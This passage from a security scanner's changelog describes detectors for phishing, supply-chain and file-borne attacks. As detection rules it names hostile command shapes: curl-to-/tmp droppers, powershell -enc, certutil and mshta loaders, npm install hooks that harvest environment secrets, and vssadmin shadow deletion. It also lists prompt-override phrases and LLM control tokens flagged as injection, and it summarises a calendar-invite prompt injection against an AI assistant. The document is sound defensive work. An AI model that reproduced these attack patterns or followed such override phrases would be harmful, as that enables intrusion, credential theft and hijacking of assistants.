  through to the text scanner clean. Now classified:
  `file://host/…` and `\\host\share` UNC paths score 55 (SMB/NTLM
  credential-leak, same class as file check F10); URL wrappers
  (`jar:`/`blob:`/`view-source:`/`filesystem:`/`ms-appx`/`chrome:`/
  extension schemes) score 35–40 AND unwrap an inner http(s) URL
  which is scored recursively; `//` protocol-relative URLs are
  scored as https; legacy cleartext transports (ftp/telnet/gopher/
  nntp/dict/tftp/ldap) and non-web fetch schemes (ssh/git/svn/hg)
  score 30. Unknown schemes remain clean.

- **Package-manager config-file scanning** (`hlse_manifest.c`,
  `hlse_cli.c`): `package --manifest` now accepts `.npmrc`,
  `pip.conf`/`pip.ini`, `.gitmodules`, and `.cargo/config.toml` —
  the same substitution surface as manifests was previously rejected
  by ecosystem inference. New `hlse_manifest_registry_host` extracts
  `registry=`/`@scope:registry=`/`disturl=` override targets; an
  off-allowlist registry scores 60 (HLSE-PKG-REGISTRY). pip.conf's
  INI `index-url = …` form feeds the existing index check;
  `.gitmodules` `url =` feeds the VCS/forge check. Host extractors
  now also stop at `\n`/`\r` (real newlines could leak into
  displayed hosts).
- **Mobile deep-link scheme detection** (`hlse_core.c`):
  `sms:`/`tel:`/`intent:`/`market:`/`whatsapp:`/`facetime:`/
  `skype:`/`mailto:` URIs score 35 — smishing, premium-rate, and
  Android intent-smuggling vectors that bypass `http(s)` URL
  filters (they sit alongside `javascript:`/`data:` in the
  scheme gate).

- **npm alias dependency-confusion check** (`hlse_manifest.c`,
  `hlse_cli.c`): `package --manifest` flags `"name": "npm:other@ver"`
  where the npm: target differs from the declared key — the manifest
  name hides the real package source (pattern_id HLSE-PKG-ALIAS,
  score 50). `hlse_manifest_alias_target` /
  `hlse_manifest_key_before` parse the specifier without a JSON
  library; self-aliases (`"x": "npm:x@…"`) stay clean.
- **Cargo `git =` dependency sources** (`hlse_manifest.c`):
  `hlse_manifest_vcs_host` now recognises the key-style form
  `git = "https://…"` / `"git": "ssh://…"` used by Cargo.toml and
  forge config — off-forge hosts score 55 alongside the existing
  git+/hg+/svn+ marker family.
- **Visible prompt-injection signals** (`hlse_text.c`): two new
  SIGNALS entries close the gap between hidden-carrier detection and
  plain-prose injections — canonical override phrases ("ignore all
  previous instructions", "disregard all previous", DAN-style "do
  anything now", role reassignment) score 40–55, and LLM control
  tokens (`<<SYS>>`, `<|im_start|>`, ChatML `[INST]`, …) score 45–60:
  tokenizer artefacts that never legitimately occur in a scanned
  document. The `blind_spot` text and `hlse_text.h` contract now
  state this coverage accurately.

- **Credential-harvest form detection — file check F13**
  (`hlse_file.c`): an HTML file whose `<form>` posts to an absolute
  remote URL and contains a password field — the standalone
  fake-login-page attachment (Cofense/Microsoft phishing reports).
  Scores 55; relative actions and password-less forms stay clean.

- **pip index-redirect check** (`hlse_manifest.c`, `hlse_cli.c`):
  `package --manifest` inspects `--index-url`/`--extra-index-url`/
  `--find-links`/`--trusted-host` hosts — every package resolves through
  them. A host that is a distance-≤2 typosquat or `pypi.org.`/`pythonhosted`
  -prefixed lookalike scores 65; a cleartext `http://` index scores 40
  (MITM-able resolution); an unknown https index scores 25 as an
  advisory (internal enterprise indexes are legitimate). Real PyPI
  hosts stay clean.

- **Authority control-character / root-dot normalization**
  (`hlse_core.c`): WHATWG URL parsing strips ASCII tab/CR/LF outright,
  so `pay\tpal.com` resolves as paypal.com while string-matching
  checks see a different host — the browser-evading spelling defeated
  every host-based check. `parse_url` now strips those controls in
  place (score 45 evasion tell) and removes a single trailing DNS-root
  dot (score 15 tell) so canonical/free-host matching sees the
  resolved identity.

- **Percent-encoded host detection** (`hlse_core.c`): `parse_url` now
  decodes %-escapes in the authority in place (same 0x20–0x7E bound as
  the path decode), so brand matching, canonical auth, free-host and
  blocklist checks see the effective identity — `pa%79pal.com` is
  paypal.com to a resolver. The raw/decoded difference scores 30 as an
  evasion tell; when the decoded host contains an authority delimiter
  (`@`, `/`, `\`) the raw and resolved authority disagree and it scores
  55 (parsing-confusion evasion).

- **VCS / direct-URL dependency-source check** (`hlse_manifest.c`,
  `hlse_cli.c`): `package --manifest` flags `git+`/`hg+`/`svn+`/`bzr+`
  URLs, PEP 440 `name @ url` direct references, and bare URLs ending in
  a package/archive tail whose host is outside the forge/registry
  allowlist — score 55. The declared dependency name says nothing about
  where the code comes from, so this catches substitution a typosquat
  check cannot see. Resolved-style fields are owned by the lockfile
  check and skipped here.

- **Obfuscated-IP host detection** (`hlse_core.c`): dotted IP literals
  in non-decimal or abbreviated form — hex labels (`0xC0.0x00.0x02.0x01`),
  octal labels (`0300.0250.0001.0001`), and shorthand 2–3-label quads
  (`127.1`) — score 40. Plain 4-label dotted quads and normal hostnames
  stay clean; the port is stripped before label analysis.

- **Lockfile `resolved`-URL poisoning detection** (`hlse_manifest.c`,
  `hlse_cli.c`): `package --manifest` now inspects `resolved` /
  `resolution` / `tarball` URL fields (npm, yarn, and pnpm formats);
  a host outside the registry/git allowlist (registry.npmjs.org,
  registry.yarnpkg.com, github.com, codeload.github.com, gitlab.com,
  bitbucket.org, raw/objects.githubusercontent.com, npmjs.com) scores
  60 — the dependency-substitution vector (Liran Tal / Snyk lockfile
  poisoning). `yarn.lock` and `pnpm-lock.yaml` now infer the `npm`
  ecosystem; subdomains of allowlisted hosts match, lookalike suffixes
  (github.com.evil.example) do not.

- **HTML smuggling detection — file check F11** (`hlse_file.c`):
  a `<script>`-carrying file whose code decodes (atob/fromCharCode),
  materializes (Blob/createObjectURL/msSaveBlob), and delivers
  (download=/.click()) a payload client-side — the wire never carries
  a file, so gateways miss it. >=2 marker families → 65, one + inline
  base64 blob → 55, one alone → 35.

- **ZIP-slip detection — file check F12** (`hlse_file.c`): walks local
  file headers in the bounded head buffer; a member name with a `..`
  segment, absolute path, or drive letter (escapes the extraction dir,
  CVE-2018-1002200 family) scores 70. `..` must be a full path
  segment, so `a..b` stays clean.

- **Trojan Source bidi detection** (`hlse_text.c`): U+202A..U+202E
  overrides and U+2066..U+2069 isolates in text content — displayed
  order differs from stored order (CVE-2021-42574). >=3 → 60, one →
  45; LRM/RLM and ALM excluded (legitimate in RTL writing).

- **NetNTLM-leak detection — file check F10** (`hlse_file.c`):
  shell-metadata carriers whose icon/URL fields fetch remote resources
  on render — desktop.ini (`[.ShellClassInfo]`+`IconResource=`), `.scf`
  (`[Shell]`+`IconFile=`), `.library-ms`/`.searchConnector-ms` XML, any
  `IconFile=`/`IconUNC=` key — score 70 on a `\\host\share` UNC
  reference and 65 on WebDAV/`DavWWWRoot` (CVE-2025-24071, NCC .scf
  advisory). The launcher path now also flags `URL=\\…` (65) and
  `file://` targets (55) in `.url`/`.webloc`/`.desktop`, and the F9
  `.lnk` table gained UNC/WebDAV/file:// needles.

- **Terminal escape injection detection** (`hlse_text.c`): raw control
  sequences embedded in untrusted text — OSC 52 clipboard write (65),
  OSC 8 hyperlink where display text can differ from the target (45),
  and any other ESC/CSI sequence that can erase or rewrite terminal
  output (30). Detected inside `hlse_check_invisible_carriers`, so both
  `text` and the per-line `scan` path cover it.

- **Weaponized `.lnk` detection — file check F9** (`hlse_file.c`):
  verifies the LNK header (`4C000000` + fixed LinkCLSID) and scans the
  embedded UTF-16LE/ASCII command line, case-insensitively, for
  interpreter/download commands (powershell -enc, cmd /c, mshta,
  certutil, rundll32, bitsadmin, http(s) URLs) — the maldocs→LNK
  loader chain used by emotet/QakBot droppers. 1 hit = 60, >=2 = 70.
  A clean shortcut (e.g. explorer.exe target) stays at F3.

- **Free-host phishing list expanded** (`hlse_core.c`): tunnels
  (ngrok.*, trycloudflare.com, loca.lt), dynamic DNS (duckdns.org,
  ddns.net, noip.me, hopto.org, zapto.org, sytes.net) and long-tail
  blog/site hosts (blogspot.com, wordpress.com, square.site,
  business.site, r2.dev). Still brand-in-subdomain gated, so bare
  tunnel names stay clean.

- **Launcher/shortcut carrier detection — file check F8**
  (`hlse_file.c`). `.desktop` `Exec=` droppers (the APT36 campaign of
  Aug 2025: phishing ZIP → `.desktop` → curl payload to /tmp → chmod+x
  → run, plus a decoy document open), `.url` InternetShortcut and macOS
  `.webloc` plist files are screened by content marker regardless of
  extension. Embedded http(s) links are delegated to `hlse_check_url`;
  `Exec=` fetch→execute (curl/wget + |sh|bash|/tmp|chmod) scores 70,
  opaque decode/exec (base64 -d, xxd -r, openssl, eval, python -c,
  perl -e) 55, bare download 35. `.desktop` and `.webloc` join the
  executable-extension table, so `invoice.pdf.desktop` hits F1=80 (the
  documented APT36 masquerade). The ICS/launcher link extractor is now a
  shared `links_max_score` helper.

- **Variation-selector smuggling detection** (`hlse_text.c`): the
  invisible-carrier scan now also catches the "ASCII smuggling via
  variation selectors" exfiltration channel — Variation Selector
  supplement characters (U+E0100..U+E01EF, ≥3 → 60; typed text never
  emits them and each encodes one payload byte) and consecutive
  variation-selector runs (≥3 → 40; a VS must follow a base character).
  Emoji VS16/ZWJ/flag sequences stay clean.

- **ICS indirect prompt injection** (`hlse_file.c` F7): VCALENDAR
  payloads containing agent-directed meta-instructions ("ignore previous
  instructions", "do not tell the user", "your system prompt" …) score
  55 — the Gemini-calendar attack (SafeBreach, Aug 2025). An invite has
  no legitimate reason to address an AI, so the general prose-injection
  FP concern is sidestepped by scoping to the ICS carrier.

- **Shai-Hulud 2.0 lifecycle IoCs** (`hlse_manifest.c`): `setup_bun.js`
  and `bun_environment.js` — the loader filenames of the Nov 2025
  second-wave npm worm — flag at 75 like `node bundle.js`.

- **ICS calendar-invite phishing — file check F7** (`hlse_file.c`).
  Malicious `.ics` invites embed credential-bait or malware links in
  `URL:`/`LOCATION:`/`DESCRIPTION:`/`ATTACH:` fields and auto-add to the
  victim's calendar, bypassing message-body scanning (Sublime Security /
  Abnormal AI 2025 reports). Content-marker based like F5 — a
  `BEGIN:VCALENDAR` block is screened regardless of extension: embedded
  http(s) links are extracted (≤1024 B each) and delegated to
  `hlse_check_url`; a link ending in an executable extension
  (.exe/.apk/.scr/.msi/.bat/.cmd/.lnk/.vbs/.ps1/.jar/.iso/.img) scores
  ≥70 outright. Contribution capped at 65. 3 tests: phish URL, exe link,
  legit meet.google.com invite (clean).

- **Japanese smishing vocabulary** (`hlse_text.c`): 16 documented
  National Police Agency / Anti-Phishing Council lure phrases — ETC
  toll impersonation (`etc利用照会`, `etcカードの有効期限`), unpaid-fee
  (`未払い料金`, `料金未払い`), My Number point / card expiry, e-Tax
  (`e-tax`, `国税電子申告`), and billing/account-update boilerplate
  (`お支払い方法の確認`, `カード情報の更新`, `アカウントの一時停止` …).

- **12 more secret prefixes** (`hlse_secrets.c`): OpenAI
  `sk-svcacct-`/`sk-admin-`, Replicate `r8_`, Hugging Face org
  `api_org_`, Slack `xapp-`/`xoxe.`, Stripe webhook `whsec_`, Shopify
  custom-app `shpca_`, Square `sq0csp-`, GitLab `gldt-`/`glrt-`/
  `glsoat-` — all documented 2024-2025 token formats that the AI-era
  leakage wave made high-value targets.

- **npm lifecycle-hook risk in `package --manifest`** (`hlse_manifest.c`,
  `hlse_cli.c`; pattern id `HLSE-PKG-HOOK`). 2025's self-propagating npm
  worms (Shai-Hulud, s1ngularity/Nx fallout) run from install hooks —
  `"postinstall": "node bundle.js"` is the canonical loader. Each
  package.json line carrying a lifecycle key is now screened for: hard
  IoCs (`node bundle.js`, webhook collectors, trufflehog), env-harvest +
  egress (`process.env` + curl/fetch/http), fetch|pipe|execute,
  credential-file + egress, and opaque decode/exec (`eval`, `atob`,
  `node -e`, base64). Findings emit like package threats (SARIF rule
  `package-lifecycle-hook`, alert rows, gate). 3 tests: both positive
  shapes plus a node-gyp/husky benign guard.

- **FileFix detection** (`hlse_text.c`). The mid-2025 ClickFix variant
  that makes File Explorer the paste target (KongTuke et al., per Check
  Point/mr.d0x): new CLICKFIX_WORDS entries cover the Explorer-address-bar
  instruction shape, and a new amplifier adds +25 when a fired
  paste-execute signal co-occurs with a File Explorer reference —
  reported as "FileFix (ClickFix variant)" in JSON reasons.

- **`hlse.pc` pkg-config descriptor** (`hlse.pc.in`, new; `Makefile`).
  `make install` now generates `$(PREFIX)/lib/pkgconfig/hlse.pc` (prefix
  substituted, `Version:` extracted from `HLSE_VERSION` so it cannot
  drift) and `make uninstall` removes it — `pkg-config --cflags --libs
  hlse` works against an installed tree.

- **`hlsed` resident file-integrity monitor** (`hlsed.c`, `hlse_daemon.c/h`,
  `hlsed.1`, `tests/daemon_integration.sh` — 15 lifecycle checks). Every
  `scan-interval` seconds (default 60) the daemon walks each `watch`
  directory and runs `hlse_check_file` + a bounded (256 KiB)
  `hlse_scan_secrets` on files whose (path, mtime, size) tuple is not in
  the in-memory dedup table — incremental scanning over the delta only.
  Poll-based by design: no fanotify/FSEvents dependency, rootless,
  identical code on Linux and macOS; an event backend can later slot
  under the same dedup contract. Findings ≥ `fail-on` (daemon default
  `alert`) are pushed through `hlse_alert` to `log-file`/syslog and
  echoed on stderr. `SIGTERM`/`SIGINT` stop cleanly (pid-file removed),
  `SIGHUP` reloads the config in place (watch list, interval, threshold,
  sinks, pid-file). `hlsed --check` validates a config + its watch dirs
  without starting — usable in a systemd `ExecStartPre`. A `pid-file` is
  `flock`-ed for the process lifetime so a second instance refuses to
  start. Foreground-only: supervise with systemd `Type=simple` or launchd.
  `SECURITY.md` gained a scoped carve-out for this in-memory, intra-process
  state (dedup table) vs. the banned cross-invocation persistent state;
  any on-disk state would need its own amendment. Config gained the
  daemon keys `watch` (repeatable, ≤8), `scan-interval` (1..86400),
  `pid-file` — parsed by `hlse_core` too so one file can serve both
  programs, and ignored there.
- **`--config <file>` runtime configuration** (`hlse_config.c/h`, new).
  Every global flag can now be defaulted from a `key = value` file —
  `json`, `sarif`, `quiet`, `syslog`, `fingerprints`, `git-history`
  (bool), `fail-on` (tier or 0–100), `from` (channel), and the
  path-valued `baseline`, `log-file`, `patterns`. The file is applied
  before argv parsing, so an explicit command-line flag always overrides
  it; a config `patterns` file is skipped wholesale when `--patterns` is
  given. Unknown keys and malformed values are hard errors (exit 2) —
  a typo'd key must never silently weaken the gate. Keys are spelled
  exactly like the long flags minus the dashes; `#` comments, blank
  lines, optional quoting of paths with spaces. New suite
  `tests/config_tests` (14 checks) + 5 CLI integration checks (p126).
- **Slopsquat advisory** (`hlse_supply.c`). Package names a full
  distance-3 from a bundled top package but absent from the snapshot
  are exactly where AI-hallucinated names land — they now produce a
  LOG-band "Slopsquat candidate" reason instead of a bare unverified
  blind spot. Dist-3 matches are advisory only: they cannot dilute the
  distance-1 amplifier (reqeusts → still BLOCK 70) nor inflate the
  close-match count that gates it (reqests → still ALERT 50).
- **Manifest-parser fuzz harness** (`tests/hlse_manifest_fuzz.c`,
  wired into `make fuzz`/`make fuzz-asan`). The three untrusted-input
  parsers — `hlse_manifest_ecosystem`, `hlse_manifest_name_pip`,
  `hlse_manifest_name_npm` — were the only untrusted-input surface
  without a fuzzer. 100k ASan iterations: 0 crashes.

### Removed

- Dead `N_SIGNALS` macro in `hlse_text.c` — the `SIGNALS` table iterates
  by its NULL sentinel; the computed-count macro was never referenced.

### Changed

- **`hlse_core.c` split — first increment** (`hlse_selftest.c/h`, new).
  The built-in self-test corpus and benchmark (~270 lines of test data
  driving only the public API) moved out of the orchestrator:
  `hlse_url_self_test`, `hlse_text_self_test`, `hlse_benchmark`.
  `hlse_core.c` 9.4k → 9.2k lines. Behavior unchanged — `--self-test`
  and `--benchmark` produce identical output.
- **`hlse_core.c` split — increment 2** (`hlse_registry.c/h`, new). The
  append-only `HLSE-*` pattern-id registry table + `--list-patterns`
  printer (~120 lines, pure data) moved out as `hlse_list_patterns`.
  `hlse_core.c` now 9075 lines.
- **`hlse_core.c` split — increments 3–6** (`hlse_channel.c/h`,
  `hlse_baseline.c/h`, `hlse_patterns.c/h`, `hlse_sarif.c/h`,
  `hlse_manifest.c/h`, `hlse_githistory.c/h`, `hlse_meta.c/h`, all new).
  Verbatim extractions along the file's own section boundaries:
  delivery-channel prior (`hlse_set_from_channel`,
  `hlse_channel_delta`, `hlse_channel_reason`); fingerprint + baseline
  suppress (`hlse_fingerprint`, `hlse_baseline_*`,
  `hlse_scan_suppress`); `--patterns` loader (`hlse_patterns_load`);
  SARIF collector + emitter (`hlse_sarif_add`, `hlse_sarif_emit`);
  manifest ecosystem/name parsers (`hlse_manifest_*`); the
  `--git-history` fork/exec walker (`hlse_scan_git_history`, now taking
  `emit_fingerprints`/`fail_threshold` as parameters instead of reading
  flag globals); and report-metadata helpers (`hlse_meta.c`: pattern-id
  ladders, blast-radius asset classes). Extracting the metadata cluster
  removed a duplicated static `action_for_score` — call sites now use
  the public `hlse_action_for_score`. Flag-state globals
  (`g_baseline_file`, `g_emit_fingerprints`, `g_git_history`) stay in
  core and are passed as parameters.
- **`hlse_core.c` split — increment 7** (`hlse_advisory.c`, new). The
  2,340-line public verdict-interpretation layer moved out verbatim:
  score→action ladders, blind-spot/exoneration hedges, attack-class
  labels + pattern ids, confidence, attacker objective, safe
  destinations, confusable/ASCII-diff reports, verify/triage/cascade
  advisories. `hlse_canonical_confirm` stays in core — it closes over
  the detector's static `BRANDS[]`/`brand_canonical` table.
- **`hlse_core.c` split — increments 8–9** (`hlse_emit.c/h`, new). The
  CLI output layer moved out verbatim with `hlse_` exports: the
  per-kind Pattern/Objective/Verify/Triage/Cascade advisory getters,
  `hlse_print_json_url`/`hlse_print_json_text`,
  `hlse_print_url_advisories`/`hlse_print_text_advisories`,
  `hlse_stdin_mode` (`g_fail_threshold` now a parameter),
  `hlse_print_usage`, `hlse_read_stdin_all`, `hlse_argv_remove`.

- **`hlse_core.c` split — increments 10-14** (`hlse_cli.h`, `hlse_cli.c`,
  new). The flag globals (`g_baseline_file`, `g_emit_fingerprints`,
  `g_git_history`, `g_fail_threshold`) and the option locals merged into
  a single `HlseCli` struct in `main()` — no file-scope flag statics
  remain. All 12 subcommand handlers then moved verbatim into
  `hlse_cli.c` as `hlse_cmd_<name>(const HlseCli *o, argc, argv, idx)`
  (network/audit take `o` only — no operand). `main()` is now config
  load + flag parse + sink init + one-line dispatch.
  `hlse_core.c` is now ~2,759 lines — engine + public API + a thin `main`.
- **JSON emit consolidation** (`hlse_emit.c/h`, `hlse_cli.c`). Three
  shared helpers now own what were per-site idioms: `hlse_json_open`
  for the `{"kind":...,"hlse_version":...` prologue (16 sites),
  `hlse_json_str_field` for the escape-then-print `,"name":"escaped"`
  pair (102 sites, retiring 43 per-site scratch buffers), and
  `hlse_json_str_elem` for escaped string-array elements (8 loops).
  Emitted bytes are unchanged.
- **`hlse_server.c` dedup.** The two `severity -> action` switch tables
  (copies of `hlse_action_for_score`'s band table) now call the shared
  mapper; the bounded-append guard idiom (~15 repetitions per
  responder) collapsed into `json_append_char`/`json_append_elem`/
  `json_append_lit`.
- **Single URL bound.** `MAX_URL` was defined once in core and twice
  more in cli/emit after the split; all sites now share
  `HLSE_MAX_URL` from `hlse_core.h`.

  Behavior unchanged throughout: full `make test` green, benchmark
  F1=1.000 / FP=0%, strict-warning gates pass in CLI and lib modes.

### Fixed
- **Unknown `--flags` silently scanned as text → fake SAFE**: flag parsing
  is match-and-remove, so a typo'd flag (`--baselne`, `--url`) fell through
  to the operand position and was scored as literal text — exit 0, "SAFE".
  Any leftover `-`-leading token in the flag region (before `--`) is now a
  usage error, except dispatch flags and subcommand-local flags
  (`--mbr`/`--manifest`/`--ransomware`/`--smb`/`--net`). `--` still escapes
  real operands that begin with '-'. Regression tests added.
- **`--log-file`/`--syslog` had no coverage on 4 subcommands + `scan`**:
  `text`, `esp`, `audit` and every `scan` finding emitted nothing to the
  sinks (only the bare-operand path did) — the JSONL trail silently
  dropped those verdicts. All now emit; `scan`/`--manifest` emit one
  record per finding. New `hlse_alert_emit_rows()` helper also collapsed
  the 8 existing copy-into-`aar[]` emit blocks to one call each.
- **`hlse-server` ignored SIGTERM/SIGINT while blocked in `accept()`**:
  handlers were installed with `signal()`, which on BSD/macOS implies
  `SA_RESTART` — the flag was set but `accept()` restarted, so the
  process only exited when the *next connection* arrived (`kill` /
  `systemctl stop` appeared to hang; test teardown orphaned the
  server). Now uses `sigaction` without `SA_RESTART` (same idiom as
  `hlse_daemon.c`), so the accept loop exits promptly.
- **`hlse-server` oversize POST returned connection-reset instead of
  413**: the early reject path closed the socket while the client's
  body was still in flight; unread receive data turns close into RST,
  discarding the response. The 413 path now half-closes
  (`shutdown(SHUT_WR)`) and drains up to 4×`MAX_BODY` before close —
  bounded, and each read is covered by `SO_RCVTIMEO`.
- **SPECIFICATION.md §1 determinism row was literally false**: it claimed
  "no time/random dependence in scoring" but `hlse_protect.c` R1 (mtime
  burst window) and S4 (canary atime) compare filesystem metadata to
  wall-clock — intentional live-incident semantics, already
  bracket-tested with `utime()` fixtures. Row now states the scoped
  exception explicitly (same pattern as the SECURITY.md daemon-state
  carve-out). AGENTS.md rule 1 bullet updated to match.
- **SPECIFICATION.md §5.2 JSON inventory was far from reality** —
  mechanically cross-checked every `--json` kind's actual field set
  against the documented inventory. Undocumented fields now written
  down: universal `hlse_version`/`severity`; `blind_spot` is
  score==0-only (never on detections); the full conditional advisory
  family (`pattern`, `pattern_id`, `objective`, `verify`, `triage`,
  `cascade_risk`, `exoneration`, `signal_count`, `confidence`); the
  `--from` channel block (`channel_delta`, `effective_score`, ...);
  per-kind extras (`clipboard.remediation`, `secret` findings
  `confidence`/`remediation` + `caveat`, `audit` `crit_count`/
  `high_count`/`next_steps`/`fix`, `package` `ecosystem`/`pattern_id`
  + `manifest_summary` terminator, `email` `body_pattern`/`body_score`,
  `scan_summary` `max_severity`/`gate_hits`/`fail_threshold`/
  `asset_classes`/`blast_radius`/`immediate_action`).
- Dead `brand_matched` store flagged by `clang --analyze`
  (DeadStores) in the hyphenated-SLD brand check — set immediately
  before `break` in its last consumer.
- `hlse.1`: `--list-patterns [--json]` was implemented but
  undocumented — added under OPTIONS.
- **macOS build and test portability** (`Makefile`, `hlse_audit.c`,
  `hlse_core.c`, `tests/cli_integration.sh`). The README's "macOS (partial)"
  platform claim was not literally true: the tree did not compile on Darwin
  at all.
  - `-D_POSIX_C_SOURCE=200809L` hides `O_NOFOLLOW` and `strcasestr` on
    Darwin, so every file that opens a scanned path with symlink protection
    failed with "use of undeclared identifier". The Makefile now adds
    `-D_DARWIN_C_SOURCE` on macOS via a `PLATFORM_CFLAGS` variable that
    rides along on every compile line — including the fuzz, coverage, and
    ASan recipes that spell the POSIX macro out literally.
  - `make check-warnings` was GCC-only: `-Wformat-truncation=2`,
    `-Wformat-overflow=2`, and `-Wstringop-overread` do not exist under
    those spellings in clang, which prints an unknown-option warning per
    file and fails the gate. The strict-flag set is now
    compiler-conditional (`STRICT_FORMAT_WFLAGS`, `WNO_STRINGOP_OVERREAD`);
    clang runs the same warnings without the level argument.
  - `-pie` is a no-op on macOS (all binaries are position-independent) and
    clang warned about it on every link; `PIE_LDFLAGS` is empty on Darwin.
  - `make static` cannot work on macOS (no static libc exists) — it now
    fails with an explicit message instead of a cryptic linker error.
  - Dead `nameserver_count` counter in `hlse_audit.c` removed, and a
    clang-only `AuditSeverity`→`int` sign-conversion warning in the audit
    CLI output fixed with an explicit cast — the strict gate is green under
    Apple clang in both CLI and `-DHLSE_CORE_AS_LIB` modes.
  - `tests/cli_integration.sh` p111 invoked the binary via a hardcoded
    `/home/user/HLSE/hlse_core`, so the `--git-history` checks could only
    pass on one developer's machine. The suite now captures the repo root
    once (`HLSE_ROOT`) and uses it inside the temp-dir subshells.
  - The p53/p61 audit-remediation assertions assumed the host sudoers has a
    NOPASSWD entry; on a hardened host nothing reaches HIGH and they failed
    spuriously. They now probe once via `--json audit` and SKIP when no
    HIGH/A7 finding exists — same convention as the existing
    /etc/hosts-writability skips.

  Result: `make`, `make check-warnings`, `make test`, `make asan-test`,
  `make fuzz`, and `make server-check` all pass on macOS (Apple clang 21):
  9 unit suites green, 776/0 CLI integration checks (3 audit checks SKIPped
  as environment-dependent), 600K fuzz iterations 0 crashes, F1 = 1.000.

- **Terminal-escape injection via attacker-controlled bytes in human
  output** (`hlse_util.c/.h`, all six verdict modules, `hlse_core.c`).
  Verdict reasons and operand echoes embed bytes the attacker chooses —
  `.efi`/`package`/`paste` filenames under scan, file content lines, email
  headers, stdin-scan echo of the input line itself. Printed raw to a
  terminal, a filename like `evil\x1b[2J… .efi` clears the screen or rewrites
  earlier verdict lines; an OSC-8 sequence plants a clickable hyperlink;
  UTF-8 C1 controls and bidi overrides (Trojan-Source style U+202E) hide or
  reorder text in terminals, pagers, and some log viewers.
  - Root cause: the JSON sinks escaped untrusted text
    (`hlse_json_escape`), but the human-readable paths printed
    attacker-derived strings verbatim. Fixed at the source rather than at
    each sink: new `hlse_sanitize_display()` in `hlse_util.c` replaces C0
    controls, DEL, UTF-8-encoded C1 controls, bidi embeddings/overrides/
    isolates, zero-width characters, U+FEFF, and the line/paragraph
    separators with `?` — in-place, so it can be applied inside the
    existing `pv_add_reason`/`av_add`/`sv_add`/`fv_add`/`add_reason`/
    `add_text_reason` helpers and the supply/email verdict exits that
    write reasons via inline `snprintf`. `hlse_display_copy()`
    (bounded copy + sanitize) now wraps every attacker-controlled operand
    at human print sites in `hlse_core.c`: stdin line echo, scanned
    paths, git-history paths, extracted URLs, manifest package names, and
    `argv` echoes for `text`/`file`/`package`/`protect`/`scan`.
  - Legitimate UTF-8 (café, 日本語, ✔) passes through byte-identical —
    only control and format codepoints are rewritten.
  - Regression coverage: 10 new cases in `tests/hlse_util_tests.c`
    (62/62) and CLI checks p125 (terminal bytes stripped from stdin echo
    and ESP filename reasons; benign UTF-8 echoed untouched) —
    781/781 CLI checks.

- **R1 mass-modification detection implemented**
  (`hlse_protect.c`). The module header documented "R1. N files changed in
  T seconds" as a compound signal, but no code ever counted it. The
  directory scan now tallies regular files whose mtime falls inside a
  120 s window (reusing the existing per-file `stat`, zero extra
  syscalls); ≥20 such files adds a +20 "R1: mass-modification burst"
  reason. Deliberately a supporting signal — it compounds with R2/R3/R4
  through the additive score and alone sits in LOG band, so builds and
  package installs stay quiet. New tests: 25 fresh files fire R1, 5 do
  not (26/26 protection tests).

- **R5 shadow-delete detection wired into `hlse_protect_scan`**
  (`hlse_protect.c`). `hlse_ransomware_check_shadow_deletion` was
  implemented, declared, and unit-tested — but never invoked by the
  unified scan, so a live `vssadmin delete shadows`/`wmic shadow`/...
  process alongside a quiet directory produced no finding. It now merges
  into the RANSOMWARE module result. The four hand-copied merge blocks
  collapsed into a shared `pv_merge()` helper — the duplication is what
  let R5 get forgotten. (Linux-only check; absent /proc is a clean no-op
  elsewhere, verified by the new clean-dir unified-scan test.)

- **JSON escaping consolidated onto `hlse_json_escape`** (`hlse_server.c`).
  `json_escape_append` was a second hand-rolled copy of the same per-byte
  escape table; it now delegates — aiming the shared bounded escaper at the
  free tail of the output buffer *is* the append. Zero behavior change; the
  server integration suite (14/14, real HTTP responses) exercises it
  end-to-end.

- **Stale documentation numbers synced to measured reality**
  (`README.md`, `CONTRIBUTING.md`, `AGENTS.md`). Structured-test totals
  re-derived from the suites (1173: 9 unit suites + corpus + 781 CLI
  checks; README claimed 1164, the CLI row claimed 784, AGENTS.md still
  documented the pre-port "714 passed / 14 failed" baseline as expected
  state). Binary-size claim updated to measured arm64 stripped size, and
  the "macOS (partial)" platform claim now reflects that the tree builds
  and passes the full suite on Darwin (`make static` remains
  unsupported — no static libc exists).

### Added
- **JWT algorithm inspection, including the `alg:none` signature bypass**
  (`hlse_util.c`, `hlse_secrets.c`). A JWT's header is base64url — encoded, not
  encrypted — so its algorithm is readable offline.
  - **`alg:none` was structurally invisible.** Such a token has an *empty*
    signature segment by construction, and the detector required
    `signature >= 20`, so it excluded exactly the most dangerous case: an
    unsigned token anyone can forge. This is the classic signature bypass and
    it still produced CVEs through Q1 2026 (CVE-2026-28802 Authlib,
    CVE-2026-23993 HarbourJwt). Now reported at 70 (BLOCK) as an attack
    artifact or misconfiguration — deliberately a *different* finding class
    from a leaked credential, with its own `HLSE-SECRET-JWT-ALG-NONE` routing
    id.
  - **Case-insensitive**, because libraries keep falling to `nOnE` / `NONE` /
    `None` variants; all four are covered by tests.
  - Ordinary signed tokens now **name their algorithm** (`alg hs256`), which is
    triage information for free.
  - New `hlse_base64url_decode()` (RFC 4648 §5, padding optional).
    +6 CLI-integration tests (p123).

- **AWS key findings now name the owning account, derived offline**
  (`hlse_util.c`, `hlse_secrets.c`). An AWS access key ID encodes the account
  number in the identifier itself: base32-decode the body, take the first 6
  bytes, mask `0x7FFFFFFFFF80`, shift right 7. Publicly documented (Tal Be'ery;
  WithSecure's bitwise analysis of AWS key identifiers) and implemented in
  several open-source extractors.
  - Turns *"a key leaked"* into *"**this account** is exposed"* — the fact
    whoever responds actually needs — with **no `sts:GetAccessKeyInfo` call**,
    which is the whole point for a scanner that must never touch the network.
    Comparable tools reach for a verification API here; the identifier already
    carries the answer.
  - Doubles as a **structural check**: a well-formed key ID is exactly 20
    characters with a valid base32 (A–Z2–7) body, so a random look-alike is
    rejected rather than annotated. The repo's own 21-character test fixture
    correctly fails it.
  - New `hlse_aws_account_from_key()`, validated against four reference
    vectors cross-checked against the published Python implementation.
    +5 util tests (52/52), +3 CLI-integration tests (p122).

- **Confusable coverage beyond the original 36 mappings** (`hlse_core.c`).
  `cp_fold()` hand-mapped ~36 code points; UTS #39's `confusables.txt` maps
  ~6,565. Spoofs built from unmapped families folded to `?`, missed the brand
  table entirely, and landed on the generic score-25 advisory — **below the
  default fail threshold of 60, so they never gated CI and never named the
  impersonated brand**. Measured before/after, all resolving to `paypal`:

  | Spoof | Before | After |
  |---|---|---|
  | Cherokee `ᏢᎪᎩᏢᎪᏞ.com` | ALERT 40, no brand | BLOCK 75, whole-script confusable |
